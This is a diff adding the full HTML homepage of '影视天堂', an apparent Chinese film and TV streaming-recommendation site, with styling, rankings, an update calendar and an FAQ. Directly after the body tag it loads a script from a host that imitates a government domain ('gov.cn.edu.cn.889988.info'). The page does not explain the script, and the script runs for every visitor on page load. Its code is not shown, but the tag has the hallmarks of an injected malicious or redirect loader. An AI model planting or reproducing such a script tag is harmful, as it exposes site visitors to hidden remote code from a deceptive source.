@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视天堂 | 影视天堂 yingshitiantang 高清影视在线观看平台</title>
+<meta name="keywords" content="影视天堂,yingshitiantang,影视天堂在线观看,电影天堂,电视剧,综艺,动漫,高清影视,免费追剧">
+<meta name="description" content="影视天堂 yingshitiantang-cn.github.io 提供高清电影、热播电视剧、综艺节目与动漫番剧在线观看，分类清晰、每日更新，支持手机电脑多端自适应访问。">
+<meta name="robots" content="index,follow">
+<meta name="author" content="影视天堂">
+<link rel="canonical" href="https://yingshitiantang-cn.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei","Segoe UI",sans-serif;background:#07090f;color:#e7eaf2;line-height:1.7;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+:root{--gold:#ffc94d;--gold2:#ff8a3d;--ink:#07090f;--paper:#0f121c;--paper2:#161a27;--line:#262c3d;--mute:#8d96ab}
+.wrap{max-width:1180px;margin:0 auto;padding:0 18px}
+
+/* ===== 顶部 ===== */
+.top{position:sticky;top:0;z-index:99;background:rgba(7,9,15,.88);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.top .wrap{display:flex;align-items:center;justify-content:space-between;height:62px;gap:14px}
+.logo{display:flex;align-items:center;gap:10px;font-size:20px;font-weight:800;color:#fff;letter-spacing:.5px}
+.logo .dot{width:34px;height:34px;border-radius:9px;background:linear-gradient(140deg,var(--gold),var(--gold2));display:grid;place-items:center;font-size:17px;box-shadow:0 5px 16px rgba(255,138,61,.42)}
+.nav{display:flex;gap:2px}
+.nav a{padding:8px 14px;border-radius:8px;font-size:14.5px;color:var(--mute);transition:.2s}
+.nav a:hover{color:#fff;background:var(--paper2)}
+.nav a.hot{color:var(--ink);background:linear-gradient(140deg,var(--gold),var(--gold2));font-weight:700}
+.nav a.hot:hover{box-shadow:0 5px 16px rgba(255,138,61,.45)}
+.burger{display:none;width:42px;height:42px;border:1px solid var(--line);border-radius:9px;background:var(--paper2);color:#fff;font-size:19px;cursor:pointer}
+
+/* ===== 通用 ===== */
+section{padding:60px 0}
+.lead-h{display:flex;align-items:flex-end;gap:14px;justify-content:space-between;flex-wrap:wrap;margin-bottom:26px}
+.lead-h .t{font-size:25px;color:#fff}
+.lead-h .t i{font-style:normal;color:var(--gold)}
+.lead-h .t em{font-style:normal;font-weight:800}
+.lead-h .d{display:block;font-size:13px;color:var(--mute);font-weight:400;margin-top:4px}
+.more{font-size:13.5px;color:var(--mute);white-space:nowrap;border-bottom:1px dashed transparent;padding-bottom:2px}
+.more:hover{color:var(--gold);border-color:var(--gold)}
+
+/* ===== Hero（方案一：对角线分割 + 剧情卡片组） ===== */
+.hero{position:relative;padding:70px 0 60px;background:
+  linear-gradient(115deg,transparent 55%,rgba(255,138,61,.14) 55%),
+  radial-gradient(700px 340px at 12% 8%,rgba(255,201,77,.18),transparent 60%),
+  linear-gradient(180deg,#0a0c14,#07090f)}
+.hero-grid{display:grid;grid-template-columns:1.05fr .95fr;gap:46px;align-items:center}
+.eyebrow{display:inline-flex;align-items:center;gap:7px;padding:5px 13px;border-radius:30px;background:rgba(255,138,61,.14);border:1px solid rgba(255,138,61,.5);color:var(--gold);font-size:12.5px;margin-bottom:18px}
+.eyebrow b{font-weight:700}
+.hero h1{font-size:43px;line-height:1.26;color:#fff;margin-bottom:16px}
+.hero h1 span{background:linear-gradient(90deg,var(--gold),var(--gold2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero .desc{color:var(--mute);font-size:15.5px;max-width:500px;margin-bottom:22px}
+.stats{display:flex;gap:26px;margin-bottom:26px;flex-wrap:wrap}
+.stats div{border-left:3px solid var(--gold);padding-left:11px}
+.stats b{display:block;color:#fff;font-size:22px}
+.stats small{color:var(--mute);font-size:12px}
+.cta{display:flex;gap:12px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:7px;padding:13px 26px;border-radius:10px;font-weight:700;transition:.2s}
+.btn-g{background:linear-gradient(140deg,var(--gold),var(--gold2));color:var(--ink)}
+.btn-g:hover{transform:translateY(-3px);box-shadow:0 12px 28px rgba(255,138,61,.45)}
+.btn-o{border:1px solid var(--line);color:#fff}
+.btn-o:hover{background:var(--paper2);border-color:var(--gold)}
+
+/* 剧情卡片组（非网格，异形排布） */
+.deck{position:relative;min-height:430px}
+.card{position:absolute;border-radius:16px;overflow:hidden;border:1px solid var(--line);background:var(--paper);box-shadow:0 18px 40px rgba(0,0,0,.5);transition:.3s}
+.card:hover{transform:translateY(-6px) scale(1.01);border-color:var(--gold2);z-index:5}
+.card .cv{height:100%;position:relative}
+.card .cv::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(5,6,12,.96))}
+.card .cv b{position:absolute;left:13px;bottom:11px;z-index:1;color:#fff;font-size:14.5px}
+.card .cv small{position:absolute;right:11px;top:11px;z-index:1;font-size:11px;padding:3px 8px;border-radius:5px;background:rgba(0,0,0,.62);color:#fff}
+.card .cv span{position:absolute;left:13px;top:11px;z-index:1;font-size:11px;color:var(--gold)}
+.c1{left:0;top:0;width:54%;height:260px}.c1 .cv{background:linear-gradient(135deg,#3a1c71,#d76d77)}
+.c2{right:0;top:20px;width:46%;height:190px}.c2 .cv{background:linear-gradient(135deg,#1a2980,#26d0ce)}
+.c3{left:12%;top:280px;width:48%;height:150px}.c3 .cv{background:linear-gradient(135deg,#f7971e,#ffd200)}
+.c4{right:0;bottom:0;width:40%;height:150px}.c4 .cv{background:linear-gradient(135deg,#870000,#190a05)}
+
+/* ===== 栏目二（方案二：圆形雷达分布 + 时间线） ===== */
+.radar{display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+.ring{position:relative;aspect-ratio:1/1;max-width:430px;margin:0 auto}
+.ring .center{position:absolute;inset:32%;border-radius:50%;background:radial-gradient(circle at 35% 30%,rgba(255,201,77,.35),transparent 65%),var(--paper2);border:1px solid var(--line);display:grid;place-items:center;text-align:center;color:#fff;z-index:3}
+.ring .center b{display:block;font-size:15px;color:var(--gold)}
+.ring .center small{font-size:12px;color:var(--mute)}
+.node{position:absolute;width:96px;border-radius:14px;overflow:hidden;background:var(--paper);border:1px solid var(--line);transition:.25s}
+.node:hover{z-index:9;border-color:var(--gold);transform:scale(1.06)}
+.node .nc{height:64px;position:relative}
+.node b{display:block;font-size:12px;color:#fff;padding:6px 8px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.n1{left:2%;top:38%;width:104px}.n1 .nc{background:linear-gradient(135deg,#4b6cb7,#182848)}
+.n2{left:24%;top:4%;width:110px}.n2 .nc{background:linear-gradient(135deg,#11998e,#38ef7d)}
+.n3{right:6%;top:22%;width:100px}.n3 .nc{background:linear-gradient(135deg,#4568dc,#b06ab3)}
+.n4{right:0;bottom:24%;width:108px}.n4 .nc{background:linear-gradient(135deg,#42275a,#734b6d)}
+.n5{left:34%;bottom:0;width:112px}.n5 .nc{background:linear-gradient(135deg,#232526,#ff416c)}
+.timeline{border-left:2px solid var(--line);padding-left:22px}
+.tl{position:relative;padding-bottom:22px}
+.tl::before{content:"";position:absolute;left:-29px;top:6px;width:12px;height:12px;border-radius:50%;background:var(--gold);box-shadow:0 0 0 4px rgba(255,201,77,.18)}
+.tl b{display:block;color:#fff;font-size:16px}
+.tl small{color:var(--gold);font-size:12px}
+.tl p{color:var(--mute);font-size:13.5px;margin-top:3px}
+
+/* ===== 栏目三（方案三：九宫格数字面板） ===== */
+.dash{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.panel{border-radius:14px;padding:22px;border:1px solid var(--line);background:linear-gradient(165deg,var(--paper2),var(--paper));transition:.25s}
+.panel:hover{transform:translateY(-4px);border-color:var(--gold2)}
+.panel.wide{grid-column:span 2}
+.panel .num{font-size:29px;font-weight:800;color:#fff;line-height:1}
+.panel .num i{font-style:normal;font-size:14px;color:var(--gold);font-weight:600}
+.panel h4{color:#fff;font-size:15px;margin:10px 0 6px}
+.panel p{color:var(--mute);font-size:13px}
+.spark{display:flex;align-items:flex-end;gap:6px;height:46px;margin-top:14px}
+.spark i{display:block;width:100%;background:linear-gradient(180deg,var(--gold),var(--gold2));border-radius:3px 3px 0 0;opacity:.85}
+
+/* ===== 栏目四（方案四：手风琴折叠问答） ===== */
+.acc{border:1px solid var(--line);border-radius:16px;overflow:hidden;background:var(--paper)}
+details{border-bottom:1px solid var(--line)}
+details:last-child{border-bottom:0}
+details[open]{background:var(--paper2)}
+summary{cursor:pointer;padding:18px 22px;color:#fff;font-size:15.5px;font-weight:600;list-style:none;display:flex;align-items:center;justify-content:space-between;gap:12px}
+summary::-webkit-details-marker{display:none}
+summary::after{content:"+";color:var(--gold);font-size:22px;flex:0 0 auto}
+details[open] summary::after{content:"–"}
+details p{padding:0 22px 18px;color:var(--mute);font-size:14px}
+
+/* ===== 页脚 ===== */
+.foot{background:#04050a;border-top:1px solid var(--line);padding:48px 0 20px}
+.foot .wrap{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:30px}
+.foot h5{color:#fff;font-size:14.5px;margin-bottom:14px}
+.foot p,.foot a{color:var(--mute);font-size:13px}
+.foot ul li{margin-bottom:8px}
+.foot ul a:hover{color:var(--gold)}
+.copy{margin-top:34px;padding-top:18px;border-top:1px solid var(--line);text-align:center;font-size:12px;color:var(--mute)}
+
+/* ===== 响应式 ===== */
+@media(max-width:960px){
+  .hero-grid,.radar,.tabs{grid-template-columns:1fr;gap:34px}
+  .deck{min-height:400px}
+  .dash{grid-template-columns:1fr 1fr}
+  .foot .wrap{grid-template-columns:1fr 1fr}
+  .hero h1{font-size:34px}
+  section{padding:48px 0}
+}
+@media(max-width:640px){
+  .burger{display:block}
+  .nav{display:none;position:absolute;top:62px;left:0;right:0;flex-direction:column;padding:14px;background:var(--paper);border-bottom:1px solid var(--line)}
+  .nav.on{display:flex}
+  .nav a{width:100%;text-align:center;padding:12px}
+  .hero h1{font-size:28px}
+  .stats{gap:18px}
+  .dash{grid-template-columns:1fr}
+  .panel.wide{grid-column:auto}
+  .foot .wrap{grid-template-columns:1fr}
+  .c1{width:60%;height:200px}.c2{width:50%;height:150px}.c3{width:52%;height:120px}.c4{width:44%;height:120px}
+  .node{width:76px!important}.node b{font-size:10.5px;padding:5px 6px}.node .nc{height:50px}
+  .ring{font-size:0}
+  .lead-h .t{font-size:21px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<div class="top">
+  <div class="wrap">
+    <a class="logo" href="#top"><span class="dot">🎬</span>影视天堂</a>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#rank">排行榜</a>
+      <a href="#update">更新日历</a>
+      <a href="#qa">常见问题</a>
+      <a href="#home" class="hot">立即播放</a>
+    </nav>
+    <button class="burger" id="burger" aria-label="菜单">☰</button>
+  </div>
+</div>
+
+<!-- Hero -->
+<section class="hero" id="top">
+  <div class="wrap">
+    <div class="hero-grid">
+      <div>
+        <span class="eyebrow"><b>●</b> 每日热播 · 实时更新</span>
+        <h1>影视天堂，<br><span>你的私人观影天堂</span></h1>
+        <p class="desc">电影、电视剧、综艺、动漫一站聚合，高清流畅播放，手机电脑多端自适应。影视天堂 yingshitiantang-cn 帮你找到下一部值得熬夜追的好片。</p>
+        <div class="stats">
+          <div><b>12,860</b><small>部影视资源</small></div>
+          <div><b>186</b><small>细分分类</small></div>
+          <div><b>24h</b><small>每日更新</small></div>
+        </div>
+        <div class="cta">
+          <a class="btn btn-g" href="#rank">▶ 开始观影</a>
+          <a class="btn btn-o" href="#update">查看更新</a>
+        </div>
+      </div>
+      <div class="deck">
+        <div class="card c1"><div class="cv"><span>TOP 1</span><small>科幻</small><b>流浪地球2</b></div></div>
+        <div class="card c2"><div class="cv"><span>热播</span><small>剧集</small><b>狂飙</b></div></div>
+        <div class="card c3"><div class="cv"><span>口碑</span><small>悬疑</small><b>漫长的季节</b></div></div>
+        <div class="card c4"><div class="cv"><span>新番</span><small>动漫</small><b>少年歌行</b></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：排行榜 -->
+<section id="home">
+  <div class="wrap">
+    <div class="lead-h">
+      <div class="t"><em>热门</em><i>·</i>排行榜<span class="d">本周影视天堂用户观看量最高的内容</span></div>
+      <a class="more" href="#">完整榜单 ›</a>
+    </div>
+    <div class="radar">
+      <div class="ring">
+        <div class="node n1"><div class="nc"></div><b>电影大片</b></div>
+        <div class="node n2"><div class="nc"></div><b>热播剧集</b></div>
+        <div class="node n3"><div class="nc"></div><b>综艺娱乐</b></div>
+        <div class="node n4"><div class="nc"></div><b>动漫番剧</b></div>
+        <div class="node n5"><div class="nc"></div><b>纪录片</b></div>
+        <div class="center"><b>影视天堂</b><small>12,860 部</small></div>
+      </div>
+      <div class="timeline">
+        <div class="tl"><small>电影 · 9.4 分</small><b>星际穿越</b><p>硬科幻神作，关于爱与时间的宇宙级浪漫，值得反复观看。</p></div>
+        <div class="tl"><small>剧集 · 9.0 分</small><b>狂飙</b><p>扫黑题材破圈之作，群像塑造扎实，剧情张力十足。</p></div>
+        <div class="tl"><small>剧集 · 8.7 分</small><b>三体</b><p>国产科幻剧标杆，对原著的还原度与制作水准双双在线。</p></div>
+        <div class="tl"><small>电影 · 8.5 分</small><b>流浪地球2</b><p>中国科幻工业新高度，宏大叙事搭配细腻情感。</p></div>
+        <div class="tl"><small>综艺 · 8.4 分</small><b>漫长的季节</b><p>悬疑外壳下的生活史诗，被低估的年度好作品。</p></div>
+        <div class="tl"><small>动漫 · 8.3 分</small><b>少年歌行</b><p>国漫武侠佳作，打斗流畅、人物鲜活，追番停不下来。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：更新日历 -->
+<section id="update" style="background:linear-gradient(180deg,#07090f,#0c0f18)">
+  <div class="wrap">
+    <div class="lead-h">
+      <div class="t"><em>每日</em><i>·</i>更新日历<span class="d">影视天堂按日期同步上架的新片与剧集</span></div>
+      <a class="more" href="#">查看全部日期 ›</a>
+    </div>
+    <div class="dash">
+      <div class="panel wide">
+        <div class="num">12,860 <i>部资源</i></div>
+        <h4>持续扩充的片库</h4>
+        <p>院线片、经典老片、热门剧集与纪录片同步收录。</p>
+        <div class="spark"><i style="height:42%"></i><i style="height:58%"></i><i style="height:35%"></i><i style="height:70%"></i><i style="height:48%"></i><i style="height:85%"></i><i style="height:60%"></i><i style="height:92%"></i></div>
+      </div>
+      <div class="panel">
+        <div class="num">186 <i>个分类</i></div>
+        <h4>分类清晰</h4>
+        <p>按题材、类型、地区快速定位。</p>
+      </div>
+      <div class="panel">
+        <div class="num">24h</div>
+        <h4>实时更新</h4>
+        <p>热门内容每日同步上架。</p>
+      </div>
+      <div class="panel">
+        <div class="num">1080P</div>
+        <h4>高清播放</h4>
+        <p>流畅稳定的观影体验。</p>
+      </div>
+      <div class="panel">
+        <div class="num">5.2万</div>
+        <h4>影迷社区</h4>
+        <p>一起聊聊好片烂片。</p>
+      </div>
+      <div class="panel wide">
+        <div class="num">4 <i>大板块</i></div>
+        <h4>电影 / 电视剧 / 综艺 / 动漫</h4>
+        <p>影视天堂 yingshitiantang 一站式覆盖，打开即看，无需繁琐操作。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：常见问题 -->
+<section id="qa">
+  <div class="wrap">
+    <div class="lead-h">
+      <div class="t"><em>常见</em><i>·</i>问题解答<span class="d">关于影视天堂的使用疑问，这里都有答案</span></div>
+      <a class="more" href="#">提交问题 ›</a>
+    </div>
+    <div class="acc">
+      <details open>
+        <summary>影视天堂主要提供哪些内容？</summary>
+        <p>影视天堂提供电影、电视剧、综艺节目与动漫番剧四大板块的影视推荐与观看指引，涵盖院线片、热播剧集、经典老片与新番内容，帮助你快速发现好片。</p>
+      </details>
+      <details>
+        <summary>网站内容多久更新一次？</summary>
+        <p>热门内容与当周新上线的影视作品保持每日更新，分类片库会同步扩充，确保推荐信息及时准确。</p>
+      </details>
+      <details>
+        <summary>支持手机和平板访问吗？</summary>
+        <p>支持。影视天堂采用移动端自适应设计，手机、平板、电脑均可正常浏览，页面会自动适配不同屏幕尺寸。</p>
+      </details>
+      <details>
+        <summary>如何快速找到想看的影视？</summary>
+        <p>可以通过首页排行榜查看热门内容，也可以通过更新日历按日期浏览新片，还能在分类片库中按题材、类型、地区筛选。</p>
+      </details>
+      <details>
+        <summary>网站上的影视信息是否准确？</summary>
+        <p>影片评分、类型、地区等基础信息会尽量保持与主流影视数据库同步更新，部分信息可能存在滞后，欢迎反馈纠错。</p>
+      </details>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="wrap">
+    <div>
+      <a class="logo" href="#top"><span class="dot">🎬</span>影视天堂</a>
+      <p style="margin-top:12px;max-width:290px">影视天堂 yingshitiantang-cn.github.io 是一个影视推荐与信息聚合站点，为你发现好片、看懂好片。</p>
+    </div>
+    <div><h5>站点导航</h5><ul><li><a href="#home">首页</a></li><li><a href="#rank">热门排行榜</a></li><li><a href="#update">更新日历</a></li><li><a href="#qa">常见问题</a></li></ul></div>
+    <div><h5>内容板块</h5><ul><li><a href="#">电影大片</a></li><li><a href="#">热播电视剧</a></li><li><a href="#">综艺娱乐</a></li><li><a href="#">动漫番剧</a></li></ul></div>
+    <div><h5>关于我们</h5><ul><li><a href="#">网站简介</a></li><li><a href="#">内容合作</a></li><li><a href="#">免责声明</a></li><li><a href="#">联系我们</a></li></ul></div>
+  </div>
+  <div class="wrap"><div class="copy">© 2026 影视天堂 yingshitiantang-cn.github.io · 本站内容仅供影视推荐与信息参考，版权归原作者及发行方所有</div></div>
+</footer>
+
+<script>
+var burger=document.getElementById('burger'),nav=document.getElementById('nav');
+burger.addEventListener('click',function(){nav.classList.toggle('on');});
+nav.querySelectorAll('a').forEach(function(a){
+  a.addEventListener('click',function(){nav.classList.remove('on');});
+});
+</script>
+</body>
+</html>
